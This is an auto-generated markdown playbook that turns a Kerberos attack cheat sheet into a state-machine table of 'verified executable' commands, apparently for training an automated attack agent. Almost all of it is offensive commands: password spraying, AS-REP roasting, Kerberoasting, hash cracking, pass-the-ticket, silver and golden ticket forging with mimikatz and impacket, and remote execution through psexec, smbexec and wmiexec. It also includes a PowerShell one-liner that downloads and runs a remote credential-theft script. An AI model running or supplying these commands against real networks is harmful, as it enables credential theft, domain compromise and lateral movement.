---
title: "Trained Command Playbook: kerberos_attacks_cheatsheet.md"
tags:
  - credential_access
  - enumeration
  - hashcat
  - https
  - impacket
  - john
  - kerberos
  - lateral_movement_routing_pivot
  - mdp
  - mimikatz
  - powershell
  - sysinternals
  - text
  - trained
source_file: kerberos_attacks_cheatsheet.md
updated: 2026-10-24 00:58:45
---

# Trained Command Playbook: `kerberos_attacks_cheatsheet.md`

- **Source Document:** `~/Projects/CORA/Training/kerberos_attacks_cheatsheet.md`
- **CEGAR Verified Commands:** `35` (`0` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `35`
- **Discovered IPs/Subnets:** `None`
- **Discovered Interfaces:** `None`
- **Related Knowledge Note:** [[knowledge/trained_kerberos_attacks_cheatsheet]]

## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `python` | `s_cross_subnet_pivot_routed` | `python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `python` | `s_active_services_enumerated` | `python ticket_converter.py ticket.kirbi ticket.ccache` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat \| john]> -outputfile <output_AS_REP_responses_file>` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `python` | `s_cross_subnet_pivot_routed` | `python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `python` | `s_active_services_enumerated` | `python ticket_converter.py ticket.ccache ticket.kirbi` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat \| john]> -outputfile <output_AS_REP_responses_file>` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `python` | `s_cross_subnet_pivot_routed` | `python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `hashcat` | `s_credentials_or_certs_acquired` | `hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `john` | `s_credentials_or_certs_acquired` | `john --wordlist=<passwords_file> <AS_REP_responses_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `iex` | `s_credentials_or_certs_acquired` | `iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `invoke-kerberoast` | `s_credentials_or_certs_acquired` | `Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat \| john]> \| % { $_.Hash } \| Out-File -Encoding ASCII <output_TGSs_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `hashcat` | `s_credentials_or_certs_acquired` | `hashcat -m 13100 --force <TGSs_file> <passwords_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `john` | `s_credentials_or_certs_acquired` | `john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python getTGT.py <domain_name>/<user_name>:[password]` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `export` | `s_credentials_or_certs_acquired` | `export KRB5CCNAME=<TGT_ccache_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `grep` | `s_credentials_or_certs_acquired` | `grep default_ccache_name /etc/krb5.conf` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # sekurlsa::tickets /export` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `export` | `s_credentials_or_certs_acquired` | `export KRB5CCNAME=<TGT_ccache_file_path>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::ptt <ticket_kirbi_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `export` | `s_credentials_or_certs_acquired` | `export KRB5CCNAME=<TGS_ccache_file>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `python` | `s_credentials_or_certs_acquired` | `python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'` |

## Verified Executable Commands (Grouped by Capability Layer)

### General_System (34 commands)
```bash
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
john --wordlist=<passwords_file> <AS_REP_responses_file>
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
hashcat -m 13100 --force <TGSs_file> <passwords_file>
john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
python getTGT.py <domain_name>/<user_name>:[password]
export KRB5CCNAME=<TGT_ccache_file>
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
grep default_ccache_name /etc/krb5.conf
mimikatz # sekurlsa::tickets /export
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
export KRB5CCNAME=<TGT_ccache_file_path>
mimikatz # kerberos::ptt <ticket_kirbi_file>
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
export KRB5CCNAME=<TGS_ccache_file>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```

### L7_HTTP_Web (1 commands)
```bash
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
```

